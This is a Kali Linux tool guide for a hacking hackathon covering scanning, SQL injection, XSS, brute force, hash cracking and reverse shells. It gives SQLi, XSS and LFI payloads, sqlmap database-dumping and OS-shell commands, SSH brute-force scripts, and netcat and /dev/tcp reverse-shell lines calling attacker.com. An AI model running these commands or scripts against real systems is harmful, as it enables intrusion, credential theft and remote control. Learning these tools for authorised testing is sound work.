# hacking

## Web Exploitation Tools & Libraries - Kali Linux Guide

### Installation & Setup

#### First Time Setup

```bash
# Update system
sudo apt update
sudo apt upgrade -y

# Install most tools (pre-installed in Kali)
sudo apt install -y nmap burpsuite sqlmap nikto hydra netcat-openbsd curl wget git python3 metasploit-framework hashcat john

# Python libraries for custom scripts
sudo pip3 install requests beautifulsoup4 paramiko pycryptodome sqlalchemy

# Optional: Download SecLists
cd ~/
git clone https://github.com/danielmiessler/SecLists.git
```

***

## 1. NMAP - Network Scanner & Port Detection

### What It Does

Discovers open ports, services, and OS information on target machines.

### Installation

```bash
# Already installed in Kali
nmap --version
```

### Basic Usage

#### Simple Port Scan

```bash
nmap 192.168.1.1
```

**Output:**

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
443/tcp   open     https
3306/tcp  open     mysql
```

#### Scan All Ports

```bash
nmap -p- 192.168.1.1
```

**Why:** Default nmap only scans top 1000 ports. `-p-` scans all 65535

#### Detailed Service Detection

```bash
nmap -sV 192.168.1.1
```

**Output includes:**

```
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6
3306/tcp open  mysql    MySQL 5.7.22
```

#### Aggressive Scan (Version + OS + Scripts)

```bash
nmap -A 192.168.1.1
```

**Includes:**

* Service versions
* OS detection
* Traceroute
* Script scanning for vulnerabilities

#### Scan Specific Ports

```bash
nmap -p 80,443,22,3306 192.168.1.1
```

#### UDP Scan

```bash
nmap -sU 192.168.1.1
```

**For:** DNS, SNMP, DHCP (UDP services)

#### Ping Sweep (Find Live Hosts)

```bash
nmap -sn 192.168.1.0/24
```

**Output:**

```
Host 192.168.1.5 is up
Host 192.168.1.10 is up
Host 192.168.1.50 is up
```

#### Save Output to File

```bash
nmap -A 192.168.1.1 -oN scan.txt
nmap -A 192.168.1.1 -oX scan.xml
nmap -A 192.168.1.1 -oG scan.gnmap
```

#### Multiple Hosts

```bash
nmap 192.168.1.{1,5,10,20}
```

#### Scan and Get Vulnerability Scripts

```bash
nmap -sV --script vuln 192.168.1.1
```

### Common Patterns for Hackathon

```bash
# Quick reconnaissance
nmap -sn 192.168.100.0/24              # Find all live hosts

# Detailed scan of target
nmap -A -p- 192.168.100.10             # All ports, detailed

# Web server detection
nmap -p 80,443,8080,8443 192.168.100.10

# Quick vulnerability check
nmap --script vuln 192.168.100.10
```

***

## 2. BURP SUITE - Web Proxy & Testing Platform

### What It Does

Intercept, modify, and replay HTTP requests. Find web vulnerabilities.

### Installation

```bash
# Pre-installed in Kali
burpsuite
```

### Starting Burp Suite

```bash
# GUI
burpsuite &

# Or from terminal
burpsuite
```

### Configuration

#### Browser Setup

1. Open Firefox
2. Settings → Network → Manual proxy configuration
3. Set HTTP proxy: 127.0.0.1:8080
4. Set HTTPS proxy: 127.0.0.1:8080

#### Get SSL Certificate

1. Start Burp Suite
2. Go to http://burpsuite in Firefox
3. Download CA Certificate
4. Import in Firefox

### Main Tabs & Usage

#### Proxy Tab - Intercept Requests

```
1. Target website: http://target.com/login
2. Intercept = On
3. Submit form
4. Burp captures request
5. Modify if needed
6. Forward
```

**Modify login request:**

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=anything
```

#### Repeater Tab - Modify & Resend

```
1. Right-click request in Proxy
2. "Send to Repeater"
3. Modify request
4. Click "Send"
5. See response
```

**Test SQLi in repeater:**

```
GET /search?q=' OR '1'='1 HTTP/1.1
Host: target.com
```

#### Intruder Tab - Brute Force Parameters

```
1. Right-click request
2. "Send to Intruder"
3. Select positions with §username§ §password§
4. Choose attack type (Sniper, Battering Ram)
5. Load wordlist
6. Start attack
```

#### Scanner Tab - Find Vulnerabilities

```
1. Right-click request
2. "Do active scan"
3. Burp tests for:
   - SQLi
   - XSS
   - CSRF
   - Insecure deserialization
```

### CLI Usage (Headless)

```bash
# Scan target automatically
burpsuite --command-line \
  --user-config-file=/path/to/config.json \
  --headless \
  --target-url=http://target.com
```

### Common Hackathon Workflow

```
1. Start Burp
2. Configure proxy
3. Browse target website normally
4. All requests captured
5. Find login form → Send to Repeater
6. Test SQLi: username=' OR '1'='1
7. Test XSS: username=<img src=x onerror=alert(1)>
8. Find vulnerable parameter
9. Exploit it
```

***

## 3. SQLMAP - SQL Injection Automation

### What It Does

Automatically finds and exploits SQL injection vulnerabilities.

### Installation

```bash
# Pre-installed in Kali
sqlmap --version

# Or install from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python3 sqlmap-dev/sqlmap.py --version
```

### Basic Usage

#### Test Single Parameter

```bash
sqlmap -u "http://target.com/search?q=test" --dbs
```

**Output:**

```
available databases:
[*] information_schema
[*] mysql
[*] wordpress_db
```

#### Test POST Parameter

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbs
```

#### Get Tables

```bash
sqlmap -u "http://target.com/search?q=test" -D wordpress_db --tables
```

**Output:**

```
[*] wordpress_db.wp_users
[*] wordpress_db.wp_posts
[*] wordpress_db.wp_comments
```

#### Dump Specific Table

```bash
sqlmap -u "http://target.com/search?q=test" -D wordpress_db -T wp_users --dump
```

**Output:**

```
Database: wordpress_db
Table: wp_users
+----+-------+------+--+
| id | name  | pass |
+----+-------+------+--+
| 1  | admin | hash |
| 2  | user  | hash |
+----+-------+------+--+
```

#### Get Current User & Database

```bash
sqlmap -u "http://target.com/search?q=test" --current-db --current-user
```

#### File Read (MySQL)

```bash
sqlmap -u "http://target.com/search?q=test" --file-read=/etc/passwd
```

#### OS Shell (if possible)

```bash
sqlmap -u "http://target.com/search?q=test" --os-shell
```

#### Batch Mode (Auto-answer yes)

```bash
sqlmap -u "http://target.com/search?q=test" --dbs --batch
```

#### Crawl and Test All Parameters

```bash
sqlmap -u "http://target.com" --crawl=2 --dbs
```

#### Save Session (Resume later)

```bash
sqlmap -u "http://target.com/search?q=test" --dbs --save=mysession
sqlmap --load=mysession --tables
```

### Common Hackathon Usage

```bash
# Quick test
sqlmap -u "http://target/search?q=1" --dbs --batch

# Get admin credentials
sqlmap -u "http://target/search?q=1" -D users -T admin --dump --batch

# Dump everything
sqlmap -u "http://target/search?q=1" --dump-all --batch

# Get OS shell
sqlmap -u "http://target/search?q=1" --os-shell

# Save output
sqlmap -u "http://target/search?q=1" --dbs --dump-all > sqlmap_results.txt
```

***

## 4. NIKTO - Web Server Scanner

### What It Does

Scans web servers for misconfigurations, outdated software, vulnerabilities.

### Installation

```bash
# Pre-installed in Kali
nikto -version

# Or install
sudo apt install nikto
```

### Basic Usage

#### Simple Scan

```bash
nikto -h http://target.com
```

**Output:**

```
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not set.
+ /admin/: Default credentials found (admin:admin)
+ /.git/: Git folder found
+ /wp-admin/: WordPress admin found
```

#### Scan Specific Port

```bash
nikto -h 192.168.1.1 -p 8080
```

#### Multiple Ports

```bash
nikto -h 192.168.1.1 -p 80,443,8080
```

#### SSL/HTTPS

```bash
nikto -h https://target.com -ssl
```

#### Save Output

```bash
nikto -h http://target.com -o report.html
nikto -h http://target.com -o report.txt
```

#### Identify CMS

```bash
nikto -h http://target.com -identify
```

**Output:**

```
WordPress 5.9 detected
WooCommerce plugin detected
```

#### Check for Plugins (WordPress)

```bash
nikto -h http://target.com -Plugins only
```

#### Aggressive Scan

```bash
nikto -h http://target.com -A
```

#### Common Hackathon Usage

```bash
# Quick scan
nikto -h http://target.com

# Full scan to file
nikto -h http://target.com -o report.html

# Identify CMS and vulnerabilities
nikto -h http://target.com -identify -A
```

***

## 5. GOBUSTER - Directory & Subdomain Brute Force

### What It Does

Finds hidden directories and subdomains on web servers.

### Installation

```bash
# Pre-installed in Kali
gobuster --version

# Or install
sudo apt install gobuster
```

### Basic Usage

#### Find Hidden Directories

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Output:**

```
/admin
/login
/config
/backup
/upload
```

#### Larger Wordlist

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### Search Specific Extensions

```bash
gobuster dir -u http://target.com -w wordlist.txt -x .php,.html,.txt,.zip
```

#### Show Status Codes

```bash
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,401,403"
```

#### Ignore Certificate Errors

```bash
gobuster dir -u https://target.com -w wordlist.txt -k
```

#### Use Custom Wordlist

```bash
gobuster dir -u http://target.com -w ~/SecLists/Discovery/Web-Content/common.txt
```

#### Threads (Speed)

```bash
gobuster dir -u http://target.com -w wordlist.txt -t 50
```

**Note:** More threads = faster but more network traffic

#### Find Subdomains

```bash
gobuster dns -d target.com -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

#### Common Hackathon Usage

```bash
# Quick directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# With extensions
gobuster dir -u http://target.com -w wordlist.txt -x .php,.html

# Show all status codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,401,403"

# Save to file
gobuster dir -u http://target.com -w wordlist.txt -o dirs.txt
```

***

## 6. CURL - HTTP Request Tool

### What It Does

Send HTTP requests, test endpoints, interact with APIs.

### Installation

```bash
# Pre-installed in Kali
curl --version
```

### Basic Usage

#### Simple GET Request

```bash
curl http://target.com
```

#### See Headers Only

```bash
curl -I http://target.com
```

**Output:**

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
Content-Length: 1234
```

#### GET with Parameters

```bash
curl "http://target.com/search?q=test&page=1"
```

#### POST Request

```bash
curl -X POST http://target.com/login -d "username=admin&password=test"
```

#### POST JSON

```bash
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}'
```

#### Custom Headers

```bash
curl -H "User-Agent: Mozilla/5.0" \
  -H "Authorization: Bearer token123" \
  http://target.com
```

#### Include Cookies

```bash
curl -b "PHPSESSID=abc123" http://target.com

# Or save cookies to file
curl -c cookies.txt http://target.com
curl -b cookies.txt http://target.com/admin
```

#### Follow Redirects

```bash
curl -L http://target.com
```

#### Save to File

```bash
curl http://target.com -o page.html
```

#### Verbose (See Request & Response)

```bash
curl -v http://target.com
```

**Shows:**

```
> GET / HTTP/1.1
> Host: target.com
> User-Agent: curl/7.68.0
< HTTP/1.1 200 OK
< Server: Apache
```

#### Test SQL Injection

```bash
curl "http://target.com/user?id=1' OR '1'='1"
```

#### Test XSS

```bash
curl "http://target.com/search?q=<script>alert(1)</script>"
```

#### Test LFI

```bash
curl "http://target.com/page.php?file=../../../../etc/passwd"
```

#### URL Encoding

```bash
# Manual encoding
curl "http://target.com/search?q=%27%20OR%20%271%27%3D%271"

# Or use --data-urlencode
curl --data-urlencode "q=' OR '1'='1" http://target.com/search
```

#### Common Hackathon Usage

```bash
# Test parameter
curl "http://target.com/search?q=test"

# SQLi test
curl "http://target.com/search?q=' OR '1'='1"

# XSS test
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"

# POST form
curl -X POST http://target.com/login \
  -d "user=admin&pass=test"

# With cookies
curl -b "session=abc123" http://target.com/admin
```

***

## 7. HYDRA - Password Brute Force

### What It Does

Brutes force usernames and passwords for various services.

### Installation

```bash
# Pre-installed in Kali
hydra -version

# Or install
sudo apt install hydra
```

### Basic Usage

#### SSH Brute Force

```bash
hydra -l admin -P wordlist.txt ssh://target.com
```

**Parameters:**

* `-l` = Single username
* `-P` = Password list
* `ssh://` = Protocol

#### HTTP Form Brute Force

```bash
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"
```

**Breakdown:**

* `/login` = Form URL path
* `username=^USER^&password=^PASS^` = Form parameters (^USER^ and ^PASS^ are placeholders)
* `Login failed` = Failed login message

#### Multiple Usernames

```bash
hydra -L usernames.txt -P passwords.txt ssh://target.com
```

**Parameters:**

* `-L` = Username list

#### Verbose Mode (See Progress)

```bash
hydra -l admin -P wordlist.txt -v ssh://target.com
```

#### FTP Brute Force

```bash
hydra -l admin -P wordlist.txt ftp://target.com
```

#### SMTP Brute Force

```bash
hydra -l admin@target.com -P wordlist.txt smtp://target.com
```

#### Parallel Threads (Faster)

```bash
hydra -l admin -P wordlist.txt -t 16 ssh://target.com
```

#### Save Output

```bash
hydra -l admin -P wordlist.txt ssh://target.com -o hydra_results.txt
```

#### Get User List First

```bash
# Username enumeration via SSH
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
  -p "" ssh://target.com -e ns
```

**`-e ns` = Try empty password (nS = "nS" stands for n:null, s:same)**

#### Common Hackathon Usage

```bash
# SSH password brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com

# HTTP form brute force
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/admin:username=^USER^&password=^PASS^:Invalid"

# Multiple users
hydra -L users.txt -P wordlist.txt ssh://target.com -t 8
```

***

## 8. NETCAT (NC) - Network Utility

### What It Does

* Listen for incoming connections
* Send data to servers
* Establish reverse shells
* Network debugging

### Installation

```bash
# Pre-installed in Kali
nc --version
# or
ncat --version
```

### Basic Usage

#### Listen for Incoming Connection

```bash
nc -lvnp 4444
```

**Parameters:**

* `-l` = Listen
* `-v` = Verbose
* `-n` = Numeric (don't resolve DNS)
* `-p` = Port

#### Connect to Server

```bash
nc target.com 80
```

#### Send Data

```bash
nc target.com 80 < request.txt
```

#### Banner Grabbing

```bash
nc target.com 22
```

**Displays:**

```
SSH-2.0-OpenSSH_7.4
```

#### Use as Proxy

```bash
nc -l -p 8080 -c "nc target.com 80"
```

#### File Transfer

**Send file:**

```bash
# Attacker sends
nc -l -p 4444 < file.txt

# Target receives
nc attacker.com 4444 > file.txt
```

#### Reverse Shell (Most Important for Hackathon!)

```bash
# On attacker machine: Listen
nc -lvnp 4444

# On target machine: Send shell
nc attacker.com 4444 -e /bin/bash

# Or if -e disabled:
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### Testing Port Connectivity

```bash
nc -zv target.com 80 443 22 3306
```

**Output:**

```
target.com 80 (http) open
target.com 443 (https) open
target.com 22 (ssh) open
target.com 3306 (mysql) open
```

#### Common Hackathon Usage

```bash
# Listen for reverse shell
nc -lvnp 4444

# Connect to service and interact
nc target.com 80

# Test connectivity
nc -zv target.com 80 443

# Simple communication
nc -l -p 5555
# In another terminal:
nc localhost 5555
```

***

## 9. HASHCAT - Password Cracking

### What It Does

Cracks password hashes using GPU acceleration.

### Installation

```bash
# Pre-installed in Kali
hashcat --version

# Or install
sudo apt install hashcat
```

### Basic Usage

#### Identify Hash Type

```bash
# Example hashes
echo "5f4dcc3b5aa765d61d8327deb882cf99" | md5sum    # MD5
echo "$2y$10$..." # bcrypt
echo "sha256_hash" # SHA256
```

#### Crack MD5 Hash

```bash
hashcat -m 0 hash.txt wordlist.txt
```

**Parameters:**

* `-m 0` = MD5 mode
* `hash.txt` = File with hashes
* `wordlist.txt` = Password list

#### Crack SHA1

```bash
hashcat -m 100 hash.txt wordlist.txt
```

#### Crack bcrypt

```bash
hashcat -m 3200 hash.txt wordlist.txt
```

#### Crack WordPress hashes

```bash
hashcat -m 400 hash.txt wordlist.txt
```

#### Crack from John the Ripper

```bash
john --format=md5 hash.txt
```

#### Crack with Rules (Variations)

```bash
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Show Cracked Password

```bash
hashcat -m 0 hash.txt wordlist.txt --show
```

#### Benchmark

```bash
hashcat -b -m 0
```

#### Common Hackathon Usage

```bash
# Crack MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack SHA256
hashcat -m 1400 hash.txt wordlist.txt

# Crack and show results
hashcat -m 0 hash.txt wordlist.txt --show
```

***

## 10. PYTHON 3 LIBRARIES for Web Hacking

### Installation

```bash
sudo pip3 install requests beautifulsoup4 paramiko pycryptodome sqlalchemy lxml
```

### 10.1 REQUESTS - HTTP Library

#### Simple GET

```python
import requests

response = requests.get('http://target.com')
print(response.text)
print(response.status_code)
```

#### GET with Parameters

```python
params = {'q': 'test', 'page': 1}
response = requests.get('http://target.com/search', params=params)
print(response.text)
```

#### POST Request

```python
data = {'username': 'admin', 'password': 'test'}
response = requests.post('http://target.com/login', data=data)
print(response.text)
```

#### JSON POST

```python
json_data = {'username': 'admin', 'password': 'test'}
response = requests.post('http://target.com/api', json=json_data)
print(response.json())
```

#### Custom Headers

```python
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Authorization': 'Bearer token123'
}
response = requests.get('http://target.com', headers=headers)
```

#### Cookies

```python
cookies = {'PHPSESSID': 'abc123'}
response = requests.get('http://target.com', cookies=cookies)

# Or auto-save
session = requests.Session()
session.get('http://target.com/login')  # Saves cookies
response = session.get('http://target.com/admin')  # Uses saved cookies
```

#### Test SQLi

```python
import requests

target = 'http://target.com/search'
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "1 UNION SELECT 1,2,3"
]

for payload in payloads:
    r = requests.get(target, params={'q': payload})
    if 'SQL' in r.text or len(r.text) > 10000:
        print(f"Vulnerable: {payload}")
```

#### Test XSS

```python
import requests

target = 'http://target.com/search'
xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
]

for payload in xss_payloads:
    r = requests.get(target, params={'q': payload})
    if payload in r.text:
        print(f"XSS Found: {payload}")
```

***

### 10.2 BEAUTIFULSOUP4 - HTML Parsing

#### Parse HTML

```python
from bs4 import BeautifulSoup
import requests

response = requests.get('http://target.com')
soup = BeautifulSoup(response.text, 'html.parser')

# Find all links
links = soup.find_all('a')
for link in links:
    print(link.get('href'))

# Find forms
forms = soup.find_all('form')
for form in forms:
    print(form.get('action'))
```

#### Extract Data

```python
from bs4 import BeautifulSoup

html = '<div class="user"><p>Name: John</p><p>Email: john@test.com</p></div>'
soup = BeautifulSoup(html, 'html.parser')

# Find by class
user = soup.find('div', class_='user')
print(user.find('p').text)  # Name: John

# Find all paragraphs
paragraphs = soup.find_all('p')
for p in paragraphs:
    print(p.text)
```

#### Find Hidden Input Values

```python
from bs4 import BeautifulSoup
import requests

r = requests.get('http://target.com/form')
soup = BeautifulSoup(r.text, 'html.parser')

# Find CSRF token
csrf_token = soup.find('input', {'name': 'csrf_token'})
print(csrf_token.get('value'))
```

***

### 10.3 PARAMIKO - SSH Library

#### Connect to SSH

```python
import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('target.com', username='admin', password='test')

# Execute command
stdin, stdout, stderr = client.exec_command('whoami')
print(stdout.read().decode())

client.close()
```

#### Brute Force SSH

```python
import paramiko

def ssh_brute_force(host, username, passwords):
    for password in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password, timeout=3)
            print(f"Success: {username}:{password}")
            client.close()
            return True
        except:
            pass
    return False

# Usage
passwords = ['test', '123456', 'password']
ssh_brute_force('target.com', 'admin', passwords)
```

***

### 10.4 CUSTOM SCRIPT - SQLi Tester

```python
#!/usr/bin/env python3

import requests
import sys

def test_sqli(url, param):
    """Test for SQL injection vulnerability"""
    
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "1 UNION SELECT 1,2,3",
        "1' AND '1'='1",
    ]
    
    print(f"[*] Testing {url} for SQLi")
    
    for payload in payloads:
        try:
            # Test payload
            params = {param: payload}
            r = requests.get(url, params=params, timeout=5)
            
            # Check for SQL errors
            if 'SQL' in r.text or 'syntax' in r.text.lower():
                print(f"[+] SQLi Found!")
                print(f"    Payload: {payload}")
                return True
                
            # Check if response size changed dramatically
            normal_r = requests.get(url, params={param: 'test'}, timeout=5)
            if len(r.text) != len(normal_r.text):
                print(f"[*] Response size changed: {len(r.text)} vs {len(normal_r.text)}")
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] No SQLi found")
    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 sqli_tester.py <url> <param>")
        print("Example: python3 sqli_tester.py http://target.com/search q")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    test_sqli(url, param)
```

#### Usage

```bash
# Save as sqli_tester.py
python3 sqli_tester.py http://target.com/search q
python3 sqli_tester.py http://target.com/product id
```

***

### 10.5 CUSTOM SCRIPT - XSS Tester

```python
#!/usr/bin/env python3

import requests
import sys

def test_xss(url, param):
    """Test for XSS vulnerability"""
    
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
    ]
    
    print(f"[*] Testing {url} for XSS")
    
    for payload in payloads:
        try:
            # Test payload
            params = {param: payload}
            r = requests.get(url, params=params, timeout=5)
            
            # Check if payload is in response (unescaped)
            if payload in r.text:
                print(f"[+] XSS Found!")
                print(f"    Payload: {payload}")
                return True
            
            # Check for partial match (common escaping)
            if '<script>' in r.text or 'onerror=' in r.text:
                print(f"[*] Tags found: {payload}")
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] No XSS found")
    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 xss_tester.py <url> <param>")
        print("Example: python3 xss_tester.py http://target.com/search q")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    test_xss(url, param)
```

#### Usage

```bash
python3 xss_tester.py http://target.com/search q
python3 xss_tester.py http://target.com/submit name
```

***

### 10.6 CUSTOM SCRIPT - Multi-Parameter Tester

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import sys

def extract_parameters(url):
    """Extract all parameters from a form"""
    
    try:
        r = requests.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        params = {}
        
        # Find all input fields
        for input_field in soup.find_all('input'):
            name = input_field.get('name')
            value = input_field.get('value', '')
            if name:
                params[name] = value
        
        return params
    except Exception as e:
        print(f"Error: {e}")
        return {}

def test_all_params(url):
    """Test all parameters for vulnerabilities"""
    
    params = extract_parameters(url)
    print(f"[*] Found {len(params)} parameters: {list(params.keys())}")
    
    for param in params:
        print(f"\n[*] Testing parameter: {param}")
        
        # Test SQLi
        test_params = params.copy()
        test_params[param] = "' OR '1'='1"
        
        try:
            r = requests.get(url, params=test_params)
            if 'SQL' in r.text:
                print(f"[+] SQLi in {param}")
        except:
            pass
        
        # Test XSS
        test_params = params.copy()
        test_params[param] = "<script>alert(1)</script>"
        
        try:
            r = requests.get(url, params=test_params)
            if '<script>' in r.text:
                print(f"[+] XSS in {param}")
        except:
            pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 multi_test.py <url>")
        print("Example: python3 multi_test.py http://target.com/search")
        sys.exit(1)
    
    url = sys.argv[1]
    test_all_params(url)
```

#### Usage

```bash
python3 multi_test.py http://target.com/search
python3 multi_test.py http://target.com/register
```

***

## QUICK REFERENCE - Tools by Purpose

### Find Open Ports & Services

```bash
nmap -A 192.168.1.1
```

### Find Web Vulnerabilities

```bash
nikto -h http://target.com
burpsuite
```

### Find Hidden Directories

```bash
gobuster dir -u http://target.com -w wordlist.txt
```

### Test SQL Injection

```bash
sqlmap -u "http://target.com/search?q=test" --dbs
curl "http://target.com/search?q=' OR '1'='1"
```

### Test XSS

```bash
curl "http://target.com/search?q=<script>alert(1)</script>"
```

### Brute Force Passwords

```bash
hydra -l admin -P wordlist.txt ssh://target.com
```

### Crack Password Hashes

```bash
hashcat -m 0 hash.txt wordlist.txt
```

### Set Up Reverse Shell Listener

```bash
nc -lvnp 4444
```

### Automated Testing (Custom)

```bash
python3 sqli_tester.py http://target.com/search q
python3 xss_tester.py http://target.com/search q
```

***

## INSTALLATION ONE-LINER

```bash
sudo apt update && sudo apt install -y nmap burpsuite sqlmap nikto hydra netcat-openbsd curl wget python3 metasploit-framework hashcat john && sudo pip3 install requests beautifulsoup4 paramiko
```

***

## KALI LINUX FOLDER STRUCTURE FOR HACKATHON

```bash
# Create organized workspace
mkdir -p ~/hackathon/{tools,scripts,wordlists,results}

# Save tools to easy location
cd ~/hackathon/tools

# Download useful wordlists
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt

# Save your scripts
cp ~/sqli_tester.py ~/hackathon/scripts/
cp ~/xss_tester.py ~/hackathon/scripts/

# Create quick launcher
cat > ~/hackathon/launch.sh << 'EOF'
#!/bin/bash
cd ~/hackathon
echo "=== Hackathon Tools Ready ==="
echo "Tools in: ~/hackathon/tools"
echo "Scripts in: ~/hackathon/scripts"
echo "Results in: ~/hackathon/results"
echo ""
echo "Quick commands:"
echo "nmap -A TARGET"
echo "nikto -h http://TARGET"
echo "gobuster dir -u http://TARGET -w wordlist.txt"
echo "sqlmap -u 'http://TARGET?id=1' --dbs"
echo "nc -lvnp 4444"
EOF

chmod +x ~/hackathon/launch.sh
```

***

## COMMONLY USED TOOL COMBINATIONS

### Complete Web App Scan

```bash
# 1. Service detection
nmap -A 192.168.100.10

# 2. Web server scan
nikto -h http://192.168.100.10

# 3. Directory enumeration
gobuster dir -u http://192.168.100.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# 4. Manual testing with Burp
burpsuite

# 5. Automatic SQLi test
sqlmap -u "http://192.168.100.10/search?q=test" --dbs

# 6. Get reverse shell
nc -lvnp 4444
# Then upload shell via RFI/upload vulnerability
```

### Login Bypass & Brute Force

```bash
# 1. Test with Burp
# - Intercept login request
# - Test SQLi: username=' OR '1'='1

# 2. Brute force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# 3. Crack any hashes found
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Post-Exploitation

```bash
# 1. Establish reverse shell
nc -lvnp 4444

# 2. Enumerate system
id
whoami
pwd
cat /etc/passwd

# 3. Find sensitive files
find / -name "*.sql" 2>/dev/null
find / -name "flag*" 2>/dev/null

# 4. Crack hashes if found
hashcat -m 1800 /etc/shadow /usr/share/wordlists/rockyou.txt
```
